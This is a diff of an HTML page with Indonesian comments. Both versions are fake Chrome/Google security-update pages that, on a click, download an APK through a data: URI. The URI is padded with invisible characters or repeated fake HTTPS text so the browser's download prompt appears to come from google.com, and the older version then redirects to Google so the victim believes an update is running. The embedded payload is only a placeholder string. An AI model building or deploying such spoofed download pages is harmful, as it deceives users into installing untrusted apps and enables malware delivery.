@@ -1,83 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update - Google</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
-        .container { border: 2px solid #333; padding: 20px; display: inline-block; border-radius: 10px; }
-        .warning { color: #f00; font-weight: bold; font-size: 1.2em; margin-bottom: 20px; }
-        #strikeBtn {
-            padding: 20px 40px;
-            background: #111;
-            color: #0ff;
-            border: 2px solid #0ff;
-            cursor: pointer;
-            font-weight: bold;
-            box-shadow: 0 0 15px #0ff;
-            border-radius: 5px;
-        }
-        #strikeBtn:hover { background: #0ff; color: #000; }
-        #status { margin-top: 20px; font-size: 0.9em; color: #888; }
-    </style>
+    <title>Chrome Security Update</title>
 </head>
-<body>
+<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
 
-    <div class="container">
-        <div class="warning">[!] CRITICAL_SYSTEM_OUTDATED</div>
-        <p>Google Play Services requires an immediate security patch.</p>
-        
-        <button type="button" id="strikeBtn">
-            UPDATE_NOW
-        </button>
+    <h2>Google Chrome Update</h2>
+    <p>Versi browser Anda sudah usang. Segera instal patch keamanan terbaru.</p>
+    
+    <button id="dl_btn" style="padding: 15px 30px; font-size: 18px; background: #4285F4; color: white; border: none; border-radius: 5px; cursor: pointer;">
+        Update Sekarang
+    </button>
 
-        <div id="status">> STANDBY: Awaiting user interaction...</div>
-    </div>
+    <script>
+        document.getElementById('dl_btn').onclick = () => {
+            const filename = "chrome_patch_2026.apk";
+            const fakeDomain = "www.google.com";
+            
+            // Chrome Android menggunakan algoritma pemangkasan yang agresif.
+            // Karakter \u2000 (En Quad) atau \u2800 (Braille) sangat efektif 
+            // karena dianggap sebagai karakter valid tapi tidak terlihat.
+            const padding = "\u2800".repeat(450); 
+            
+            // Struktur: data:[MIME];base64,[PAYLOAD]#[PADDING][FAKE_ORIGIN]
+            // Kita pakai MIME APK agar lebih berbahaya secara konteks.
+            const payload = `data:application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=#${padding}https://${fakeDomain}/chrome/update/stable/`;
 
-<script>
-    document.getElementById('strikeBtn').addEventListener('click', function() {
-        // --- 1. CONFIGURATION ---
-        const filename = "Google_Safe_Update.apk";
-        const realDomain = "google.com";
-        
-        // --- 2. ADVANCED SPOOFING LOGIC ---
-        // Menggunakan RLO (Right-to-Left Override) atau karakter khusus terkadang bisa membalikkan nama file.
-        // Tapi di sini kita fokus pada 'Middle Truncation' yang kamu temukan.
-        
-        // Gunakan padding yang sangat panjang dengan campuran skema HTTPS palsu
-        // %E2%80%80 adalah En Quad (invisible space) untuk menjauhkan origin asli dari pandangan
-        const padding = ".https://" + realDomain + "/secure-update/".repeat(20);
-        
-        // Menambahkan null byte (%00) di beberapa browser bisa menghentikan pembacaan string UI
-        const longSub = realDomain + padding;
-
-        // --- 3. PAYLOAD CONSTRUCTION ---
-        // Kita gunakan MIME type 'application/octet-stream' agar dianggap binary oleh Firefox
-        // Base64 di bawah hanya contoh APK kosong.
-        const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; 
-        const payload = `data:application/octet-stream;base64,${base64Payload}#${longSub}`;
-
-        // --- 4. EXECUTION ---
-        const a = document.createElement('a');
-        a.href = payload;
-        a.download = filename;
-        
-        // Berikan atribut tambahan untuk memperkuat 'Hint' ke browser
-        a.rel = "noopener";
-        
-        document.body.appendChild(a);
-        a.click();
-        
-        document.getElementById('status').innerText = "> STRIKE_SENT: Processing download via " + realDomain;
-
-        // --- 5. CLEANUP & STEALTH REDIRECT ---
-        setTimeout(() => {
+            const a = document.createElement('a');
+            a.href = payload;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
             document.body.removeChild(a);
-            // Redirect ke halaman bantuan Google asli agar user mengira update sedang berjalan di background
-            window.location.replace("https:/google.com);
-        }, 2000);
-    });
-</script>
+        };
+    </script>
 </body>
 </html>
